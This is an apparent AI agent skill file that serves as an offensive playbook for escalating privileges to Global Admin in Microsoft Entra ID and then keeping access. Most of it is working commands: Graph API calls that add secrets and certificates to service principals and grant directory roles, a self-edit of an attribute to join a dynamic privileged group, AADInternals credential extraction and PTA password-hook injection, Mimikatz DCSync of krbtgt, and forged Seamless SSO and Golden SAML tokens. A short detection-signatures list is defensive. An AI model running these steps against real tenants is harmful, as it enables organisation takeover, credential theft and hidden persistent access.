---
name: entra-privesc
description: "Entra ID privilege escalation + persistence — app role/owner abuse, service-principal credential addition, dynamic group membership abuse, Administrative Unit role assignment, hybrid identity attacks (Connect, PHS, PTA, Seamless SSO, Golden SAML), Graph API privesc paths."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "entra azure ad privilege escalation persistence app owner service principal credential addition dynamic group administrative unit hybrid aad connect phs pta seamless sso golden saml graph api privesc"
  subdomain: cloud
  tags: azure, entra-id, privesc, persistence, hybrid-identity
  mitre_attack: T1098, T1098.001, T1098.003, T1556.007, T1606.002, T1078.004
---

# Entra Privilege Escalation & Persistence

You have a token with non-trivial permissions in Entra ID. Walk the escalation graph to Global Admin / org takeover, then plant persistence that survives password resets.

## Phase 0: Map current privileges

```bash
TOKEN=<MS_GRAPH_TOKEN>
# Roles I directly hold
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/memberOf?\$select=displayName,roleTemplateId" | jq .

# Apps I OWN (owners can mint credentials)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/ownedObjects" | jq '.value[]|{type:.["@odata.type"],id,name:.displayName}'

# Groups where I'm an owner (can add members)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/ownedObjects?\$filter=isof('microsoft.graph.group')"
```

## Phase 1: App role / app owner abuse

### Owner → credential addition → app's directory roles
```bash
APP_OBJ=<APP_OBJECT_ID>     # not appId — objectId of the Application
# Mint a 2-year client secret on an app you OWN:
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/${APP_OBJ}/addPassword" \
  -d '{"passwordCredential":{"displayName":"backup-cred","endDateTime":"2027-01-01T00:00:00Z"}}'
# Returned secretText -> auth as the service principal:
curl -s -X POST "https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token" \
  -d "client_id=<APP_ID>&client_secret=<SECRET>&grant_type=client_credentials&scope=https://graph.microsoft.com/.default"
```

If the target SP has any of these app roles, you have GA-equivalent:
- `RoleManagement.ReadWrite.Directory`
- `Application.ReadWrite.All`
- `AppRoleAssignment.ReadWrite.All`
- `Directory.ReadWrite.All` (limited but powerful)

### Adding a high-priv app role to your SP
```bash
# Find the Microsoft Graph SP objectId and the role:
GRAPH_SP=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'" | jq -r '.value[0].id')
ROLE_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${GRAPH_SP}" \
  | jq -r '.appRoles[]|select(.value=="RoleManagement.ReadWrite.Directory").id')
# Grant the role to your SP (requires Application.ReadWrite.All today):
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/<MY_SP>/appRoleAssignments" \
  -d "{\"principalId\":\"<MY_SP>\",\"resourceId\":\"${GRAPH_SP}\",\"appRoleId\":\"${ROLE_ID}\"}"
```

## Phase 2: Service principal credential addition (persistence)

Existing SP with high privs (e.g. tenant-installed Microsoft 365 management app) → add a credential. Survives the original user's password reset.

```bash
SP_ID=<TARGET_SP_OBJECT_ID>
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_ID}/addPassword" \
  -d '{"passwordCredential":{"displayName":"cert-rotation","endDateTime":"2027-12-31T00:00:00Z"}}'
# Auth as that SP indefinitely.
```

Certificate variant (less audited than secrets):
```bash
openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -days 730 -out c.pem -subj "/CN=evt"
CERT_B64=$(openssl x509 -in c.pem -outform DER | base64 -w0)
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_ID}/addKey" \
  -d "{\"keyCredential\":{\"type\":\"AsymmetricX509Cert\",\"usage\":\"Verify\",\"key\":\"${CERT_B64}\"}}"
```

## Phase 3: Dynamic group abuse

Dynamic groups grant role membership based on user attributes. Some attributes are user-editable (e.g. `otherMails`, `state`, `department`).

```bash
# Find dynamic groups bound to privileged roles:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?\$filter=groupTypes/any(c:c eq 'DynamicMembership')" \
  | jq '.value[]|{n:.displayName,rule:.membershipRule}'
# Look for: (user.otherMails -contains "admin@") or (user.department -eq "IT")
# If you control any "self-service" attribute that matches the rule, write it:
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/me" \
  -d '{"otherMails":["admin@<TARGET>"]}'
# Recompute happens automatically; you land in the privileged group within minutes.
```

## Phase 4: Administrative Unit (AU) abuse

AU-scoped admins (e.g. `User Administrator` over `Sales AU`) can reset passwords for users in that AU — including any user whose group/role is itself AU-administered. Chains:

```bash
# List AUs and their scoped role assignments:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/directory/administrativeUnits?\$expand=members" | jq .
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?\$filter=directoryScopeId ne '/'" | jq .
# AU UserAdmin → reset password of an AU-member who is a global Application Administrator → mint SP cred → Graph privesc.
```

## Phase 5: Hybrid identity attacks

### AAD Connect → MSOL DCSync
On the AAD Connect server (Windows): the `MSOL_xxxxxxx` account has DCSync rights on the on-prem domain. Extract via AADInternals:

```powershell
# As SYSTEM on AAD Connect host:
Get-AADIntSyncCredentials       # exposes MSOL plaintext password + Sync_xxx cloud account
# Then on-prem DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"'
```

### Pass-Through Authentication (PTA) skeleton key
PTA agent installed on a server validates passwords against on-prem AD. Hooking the agent's `AzureADConnectAuthenticationAgentService.exe` → accept any password for any user:

```powershell
Install-AADIntPTASpy             # AADInternals — DLL inject; logs all PTA creds + accepts any password
```

Detected by AV but trivial PoC for environments without EDR on AAD Connect host.

### Password Hash Sync (PHS) abuse
With cloud-side `Sync_<tenant>` account creds (extractable by Get-AADIntSyncCredentials), inject arbitrary NTLM hashes for cloud-only users:

```powershell
Set-AADIntUserPassword -SourceAnchor <BASE64_IMMUTABLEID> -Hash <NTLM_HASH> -Verbose
```

### Seamless SSO Silver Ticket → arbitrary cloud user
Seamless SSO uses the on-prem `AZUREADSSOACC$` computer account's NTLM hash to sign Kerberos tickets. With that hash (DCSync), forge a TGS for any user → cloud auth without password:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:<TARGET_UPN_PREFIX> /sid:<DOMAIN_SID> /target:aadg.windows.net.nsatc.net /service:HTTP /rc4:<AZUREADSSOACC_HASH> /ptt"'
# Then browse to https://login.microsoftonline.com → seamless auth as <TARGET_UPN_PREFIX>@<TARGET>.
```

### Golden SAML
For federated tenants (ADFS), with the ADFS token-signing certificate:

```powershell
Export-AADIntADFSSigningCertificate     # AADInternals — pulls cert from ADFS host
New-AADIntSAMLToken -ImmutableID <BASE64> -Issuer http://<ADFS>/adfs/services/trust/ -PfxFileName cert.pfx -PfxPassword '' -UseBuiltInCertificate
# Mint SAML for ANY user in the federated domain, indefinitely. No password, no MFA, no logs at ADFS (forged offline).
```

## Phase 6: Graph API privesc primitives

| Permission | Path to GA |
|---|---|
| `RoleManagement.ReadWrite.Directory` | Direct: assign self Global Admin role |
| `Application.ReadWrite.All` | Mint cred on a high-priv SP → that SP's roles |
| `AppRoleAssignment.ReadWrite.All` | Grant your own SP `RoleManagement.ReadWrite.Directory` |
| `Directory.ReadWrite.All` | Reset non-admin passwords + group membership changes |
| `User.ReadWrite.All` + group-owner of role-assignable group | Add self to role-assignable group |
| `Policy.ReadWrite.ConditionalAccess` | Disable CA on the BG account, then go quiet |
| `Domain.ReadWrite.All` | Add an attacker-owned federated domain → impersonate any user via Golden-SAML-style trust |

## Chains
- **Phished low-priv user owns one app with `Application.ReadWrite.All` → mint SP cred → grant self `RoleManagement.RW` → assign self Global Admin**.
- **Dynamic-group rule on `otherMails` → self-PATCH → land in role-assignable group → GA in minutes**.
- **AU UserAdmin → reset AU-member who is Application Admin → SP cred persistence**.
- **AAD Connect compromise → MSOL DCSync → on-prem domain + AzureADSSOACC$ hash → cloud user impersonation**.
- **ADFS token-signing cert → Golden SAML → permanent cloud identity bypass** (survives password resets, MFA, CA — only domain re-federation kills it).

## Tools
- **AADInternals** — sync creds, PTA Spy, Golden SAML, hash injection.
- **ROADtools roadtx** — Graph-side enum + token operations.
- **AzureHound** — BloodHound for Entra; finds privesc edges automatically.
- **MicroBurst** — Azure-focused PowerShell offensive toolkit.
- **GraphRunner** — interactive Graph operator.
- **adconnectdump** — extract MSOL credentials non-interactively.

## Detection signatures
- Audit log `Add service principal credentials` / `Update application – Certificates and secrets management` from non-Identity admin = persistence flag.
- Role assignment outside PIM (`Add member to role` without `Add eligible member`) = privesc indicator.
- New federated domain (`Set domain authentication`) is a critical-tier alert in Sentinel — used for Golden SAML setup.
- Dynamic group rule re-evaluation log + corresponding `Update user` event on attacker-controlled attribute = correlation signature.
- AAD Connect host: any non-msol process touching `LSASS` or `MIIServer.exe` = MSOL extraction.

## Decision gate
- Have `Application.ReadWrite.All` or own an app with it → take the SP cred → GA path is 2 API calls.
- AAD Connect host accessible → MSOL + AzureADSSOACC$ unlocks both on-prem and cloud halves; prefer this for long-term.
- Federated tenant + ADFS host accessible → Golden SAML is the cleanest persistence (offline, no API calls until use).
- No clear path → drop a credential on a low-noise SP for persistence and revisit after more recon (`entra-enum`).
